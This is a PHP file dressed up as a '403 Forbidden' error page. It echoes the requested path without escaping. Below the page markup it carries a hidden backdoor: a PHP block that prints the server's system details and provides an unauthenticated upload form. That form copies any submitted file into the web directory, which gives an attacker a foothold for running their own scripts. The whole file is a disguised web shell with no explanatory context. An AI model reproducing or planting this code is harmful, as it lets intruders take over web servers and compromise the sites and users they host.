<html>
<head>
    <title>403 Forbidden</title>
</head>
<body>
    <h1>Forbidden</h1>
    <?php
    $url_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    $url_parts = pathinfo($url_path);
    
    echo '<p>You don\'t have permission to access ' . $url_parts['dirname'] . '/' . $url_parts['basename'] . ' on this server.</p>';
    ?>
    <hr>
</body>
</html>
<?php echo '<pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
